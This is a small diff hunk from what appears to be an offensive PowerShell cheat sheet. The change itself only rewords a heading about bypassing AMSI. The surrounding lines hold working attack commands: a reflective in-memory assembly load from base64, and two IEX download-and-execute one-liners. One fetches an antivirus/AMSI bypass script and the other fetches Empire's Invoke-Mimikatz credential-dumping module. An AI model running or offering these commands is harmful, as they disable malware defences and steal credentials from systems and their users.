@@ -15,7 +15,7 @@ Loadoad it into memory
 ```
 [Reflection.Assembly]::Load([Convert]::FromBase64String($OriginalCommand)) | Out-Null
 ```
-### Byusing Third Party AMSI
+### AMSI Bypassing  By using Third Party
 ```
 IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1')
 IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
